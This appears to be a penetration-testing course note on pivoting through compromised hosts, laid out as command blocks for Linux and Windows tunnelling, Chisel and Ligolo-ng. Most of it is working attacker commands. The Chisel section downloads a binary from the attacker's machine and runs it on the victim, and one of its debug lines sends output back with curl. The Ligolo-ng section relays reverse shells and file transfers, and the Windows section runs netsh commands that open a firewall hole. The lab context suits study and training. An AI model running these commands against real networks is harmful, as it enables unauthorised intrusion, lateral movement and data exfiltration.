
| [[09 Tunneling#Linux Tunneling\|Linux Tunneling]] | [[09 Tunneling#Windows Tunneling\|Windows Tunneling]] | [[09 Tunneling#HTTP Tunneling with Chisel\|HTTP Tunneling with Chisel]] | [[09 Tunneling#Ligolo-ng\|Ligolo-ng]] |
| ---------------------------------------------- | -------------------------------------------------- | -------------------------------------------------------------------- | ---------------------------------- |
## Linux Tunneling
```shell
### Ensure TTY functionality via Python3
confluence@confluence01:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'

### Basic Port Forwarding with Socat
# listen on TCP-LISTEN:<PORT>, forward to TCP:<IP>:<PORT>
confluence@confluence01:~$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.124.215:5432


# Connect to PGSRV01 via CONFLUENCE01
kali@kali:~$ psql -h <CONFLUENCE01_IP> -p 2345 -U postgres

### SSH Local Port Forwarding with OpenSSH
# Local Port Forward with -L, Listen on Port 4455, Forward to PGSRV01 Port 445 (SMB), Use SSH Tunnel to PGSRV01
confluence@confluence01:~$ ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215


# Connect to PGSRV01 SMB Shares via CONFLUENCE01
kali@kali:~$ smbclient -p 4455 -L //<CONFLUENCE01_IP>/ -U hr_admin --password=Welcome1234

### SSH Dynamic Port Forwarding
# Dynamic Port Forward with -D, Use SSH Tunnel to PGSRV01
confluence@confluence01:~$ ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215


# Edit Proxychains conf file
kali@kali:~$ nano /etc/proxychains4.conf
# Ensure socks5 <TARGET_IP> <TARGET_PORT> at the bottom in ProxyList

# Run proxychains with smbclient
kali@kali:~$ proxychains smbclient -L //<PGSRV01_IP>/ -U hr_admin --password=Welcome1234

### SSH Remote Port Forwarding
# Start ssh server on Kali
kali@kali:~$ sudo systemctl start ssh 

# Setup SSH remote port forward on CONFLUENCE01
confluence@confluence01:~$ ssh -N -R 127.0.0.1:2345:10.4.124.215:5432 kali@<KALI_IP>

# Enumerate Postgres SQLDB via remote port forward
kali@kali:~$ psql -h 127.0.0.1 -p 2345 -U postgres

### SSH Remote Dynamic Port Forwarding
# Start ssh server on Kali
kali@kali:~$ sudo systemctl start ssh 

# Setup SSH remote dynamic port forward on CONFLUENCE01
confluence@confluence01:~$ ssh -N -R 9998 kali@<KALI_IP>

# Edit Proxychains conf file
kali@kali:~$ nano /etc/proxychains4.conf
# Ensure socks5 127.0.0.1 9998 at the bottom in ProxyList

# Run nmap with Proxychains
kali@kali:~$ proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.124.64

### SSHuttle
# Setup SSH local port forwarding
confluence@confluence01:~$ socat TCP-LISTEN:2222,fork TCP:10.4.124.215:22

# Run SSHuttle on Kali
kali@kali:~$ shuttle -r database_admin@192.168.124.63:2222 10.4.124.0/24 172.16.1244.0/24
# configures all traffic to the subnet ranges to be pushed through the SSH tunnel to PGSRV01
```
## Windows Tunneling
```shell
### Remote Dynamic Port Forwarding with ssh.exe
# Ensure SSH server is running on Kali
kali@kali:~$ sudo systemctl start ssh

# Determine if SSH exists and version number
C:\Users\offsec> where ssh
C:\Users\offsec> ssh.exe -V
# If version > 7.6 can use for remote dynamic port forwarding

# Create remote dynamic port forward to Kali
C:\Users\offsec> ssh -N -R 9998 kali@<KALI_IP>

# Edit Proxychains conf file
kali@kali:~$ nano /etc/proxychains4.conf
# Ensure socks5 127.0.0.1 9998 at the bottom in ProxyList

### Create remote port forward with PLink
# Transfer PLink in and setup remote port forward to MULTISERVER03 RDP Port
C:\Users\offsec> .\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.191
#  Listen on Kali 9833, output port on target ip and port 3389

### Setup Local Port Forwarding with Netsh (NEED ADMIN)
C:\Users\offsec> netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.124.64 connectport=22 connectaddress=10.4.50.215
# listen address and port on current machine, should be accessible from Kali
# connect address and connect port should be internal server

# If firewall blocks 2222, use netsh to create hole
C:\Users\offsec> netsh advfirewall firewall add rule name="portforward_ssh_2222" protocol=TCP dir=in localip=192.168.124.64 localport=2222 actin=allow
```

## HTTP Tunneling with Chisel
```shell
# Prep python3 http server with chisel binary
kali@kali:~$ python3 -m http.server 80

# Download file from Kali
confluence@confluence01:~$ wget <KALI_IP>/chisel -O /tmp/chisel && chmod +x /tmp/chisel

# Start Chisel reverse port forward server on Kali
kali@kali:~$ chisel server --port 8080 --reverse

# Log if needed
kali@kali:~$ sudo tcpdump -nvvvXi tun0 tcp port 8080

# Create reverse SOCKS tunnel, run in background
confluence@confluence01:~$ /tmp/chisel client <KALI_IP>:8080 R:socks > /dev/null 2>&1 &

# Debug command, check /tmp/output or Kali tcpdump for logs
confluence@confluence01:~$ /tmp/chisel client <KALI_IP>:8080 R:socks &> /tmp/output; curl --date @/tmp/output http://<KALI_IP>:8080 
# If error version glibc not found, use v1.8.1

# Use proxycommand and ncat to use the proxy
kali@kali:~$ ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
# refer to kali chisel server output for port number, %h %p tokens for ssh command host and port values autofilled by ssh
```
## Ligolo-ng
```shell
# Prep Ligolo's tunnel interface
kali@kali:~$ sudo ip tuntap add user $(whoami) mode tun ligolo
kali@kali:~$ sudo ip link set ligolo up

# Start Ligolo proxy on Kali (attacker machine)
kali@kali:~$ ./linux_amd64-proxy -selfcert -laddr 0.0.0.0:443

# Transfer Ligolo Agent and run on victim (target machine)
C:\xampp> .\win64-agent.exe -connect 192.168.45.221:443 -ignore-cert

# Start Session with the Victim and check subnets to add on Kali (attacker)
ligolo-ng>> session
ligolo-ng>> ifconfig

# Add the route to ligolo on Kali (attacker machine)
kali@kali:~$ sudo ip route add 192.168.197.96/32 dev ligolo # OR
kali@kali:~$ sudo ip route add 240.0.0.1/32 dev ligolo # Host machine only
# This is for Local Port Forward aka accessing ports within the machine itself

# Start tunnel
ligolo-ng>> start 

# To receive reverse shells, setup listener
ligolo-ng>> listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444 --tcp
# Listen on Agent (target machine) on Port 1234
# Redirect to Kali (attacker machine) on Port 4444

# To transfer files, setup listener
ligolo_ng>> listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80
# Listen on Agent (target machine) on Port 1235
# Redirect to Kali (attacker machine) on Port 80
```